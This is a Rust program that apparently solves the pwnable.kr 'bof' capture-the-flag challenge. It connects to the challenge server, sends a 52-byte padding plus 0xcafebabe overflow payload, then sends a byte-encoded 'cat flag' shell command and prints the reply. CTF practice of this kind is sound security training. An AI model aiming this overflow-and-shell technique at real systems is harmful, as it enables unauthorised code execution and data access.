use std::io::{Read, Write};
use std::net::TcpStream;

const READ_BYTES: usize = 2048;

struct BofStream {
    stream: TcpStream,
    read_buffer: [u8; READ_BYTES],
    bytes_read: usize,
}

pub fn bof(){
    let mut bof_stream = BofStream {
        stream: TcpStream::connect("pwnable.kr:9000").unwrap(),
        read_buffer: [0; READ_BYTES],
        bytes_read: 0,
    };
    // 'A' * 52 + be ba fe ca
    let mut overflow_bytes: Vec<u8> = vec!['A' as u8; 52];
    overflow_bytes.extend(vec![190, 186, 254, 202]);
    bof_stream.write_bytes(&mut overflow_bytes);

    // cat flag
    let mut cat_flag_bytes: Vec<u8> = vec![99, 97, 116, 32, 102, 108, 97, 103];
    bof_stream.write_bytes(&mut cat_flag_bytes);

    bof_stream.read_message();
}

impl BofStream {
    fn read_message(&mut self) {
        self.bytes_read = self.stream.read(&mut self.read_buffer).unwrap();
        println!("{}", std::str::from_utf8(&self.read_buffer[..self.bytes_read]).unwrap());
    }

    fn write_bytes(&mut self, bytes: &mut Vec<u8>) {
        bytes.push('\n' as u8);
        self.stream.write(bytes).unwrap();
    }
}